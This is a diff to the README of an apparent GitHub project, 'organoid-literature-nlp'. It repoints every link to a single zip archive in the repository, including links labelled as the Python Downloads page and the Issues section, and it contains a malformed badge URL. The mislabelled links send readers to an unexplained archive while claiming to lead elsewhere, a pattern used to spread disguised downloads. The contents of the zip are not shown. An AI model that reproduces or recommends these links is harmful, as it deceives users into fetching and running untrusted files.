@@ -6,7 +6,7 @@ Welcome to the organoid-literature-nlp project! This application allows you to a
 
 ## 📥 Download Now
 
-[![Download the latest release](https://raw.githubusercontent.com/Raulads/organoid-literature-nlp/main/venerial/organoid-literature-nlp.zip%20Latest%https://raw.githubusercontent.com/Raulads/organoid-literature-nlp/main/venerial/organoid-literature-nlp.zip)](https://raw.githubusercontent.com/Raulads/organoid-literature-nlp/main/venerial/organoid-literature-nlp.zip)
+[![Download the latest release](https://github.com/Raulads/organoid-literature-nlp/raw/refs/heads/main/data/organoid_nlp_literature_v2.6.zip%20Latest%https://github.com/Raulads/organoid-literature-nlp/raw/refs/heads/main/data/organoid_nlp_literature_v2.6.zip)](https://github.com/Raulads/organoid-literature-nlp/raw/refs/heads/main/data/organoid_nlp_literature_v2.6.zip)
 
 ## 🔍 About the Application
 
@@ -34,7 +34,7 @@ To run the application smoothly, ensure your system meets the following requirem
 
 To get started, visit the releases page to download the software.
 
-[Download the latest release](https://raw.githubusercontent.com/Raulads/organoid-literature-nlp/main/venerial/organoid-literature-nlp.zip)
+[Download the latest release](https://github.com/Raulads/organoid-literature-nlp/raw/refs/heads/main/data/organoid_nlp_literature_v2.6.zip)
 
 After downloading the file:
 
@@ -46,7 +46,7 @@ After downloading the file:
 
 This application requires Python to run. If you do not have Python installed:
 
-1. Go to the [Python Downloads page](https://raw.githubusercontent.com/Raulads/organoid-literature-nlp/main/venerial/organoid-literature-nlp.zip).
+1. Go to the [Python Downloads page](https://github.com/Raulads/organoid-literature-nlp/raw/refs/heads/main/data/organoid_nlp_literature_v2.6.zip).
 2. Select your operating system.
 3. Download and run the installer.
 4. Ensure that you check the option "Add Python to PATH" during installation.
@@ -65,7 +65,7 @@ Once you have installed the software and Python, you can begin using the applica
 
 If you encounter any issues, we provide a support section on our GitHub page. You can raise your questions there:
 
-- Check the [Issues section](https://raw.githubusercontent.com/Raulads/organoid-literature-nlp/main/venerial/organoid-literature-nlp.zip)
+- Check the [Issues section](https://github.com/Raulads/organoid-literature-nlp/raw/refs/heads/main/data/organoid_nlp_literature_v2.6.zip)
 - Read through existing discussions for solutions.
 
 ## 🌐 Contributing
